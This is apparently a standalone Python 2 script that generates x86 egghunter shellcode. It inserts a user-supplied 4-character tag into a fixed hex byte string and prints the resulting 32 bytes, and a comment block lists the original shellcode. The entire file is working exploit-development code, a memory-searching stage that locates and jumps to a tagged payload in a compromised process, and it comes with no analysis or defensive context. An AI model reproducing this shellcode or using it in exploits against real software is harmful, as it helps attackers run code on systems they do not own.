#!/usr/bin/python
from binascii import unhexlify
import sys

# x86
# Original shellcode - 32 bytes
# "\x66\x81\xca\xff"
# "\x0f\x42\x52\x6a"
# "\x02\x58\xcd\x2e"
# "\x3c\x05\x5a\x74"
# "\xef\xb8\x62\x33" #b3
# "\x33\x66\x8b\xfa" #3f
# "\xaf\x75\xea\xaf"
# "\x75\xe7\xff\xe7"

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "Usage: %s EGG" % (sys.argv[0])
        sys.exit(1)
    else:
        egg = sys.argv[1]
        if len(egg) != 4:
            print "[!] EGG must be 4 characters long"
            sys.exit(1)
       
        shellcode = "6681caff0f42526a0258cd2e3c055a74efb8"
        shellcode += egg.encode("hex")
        shellcode += "8bfaaf75eaaf75e7ffe7"
       
        result = unhexlify(shellcode)
        print "Length: %d" % len(result)
        print "Shellcode: %s" % repr(result)
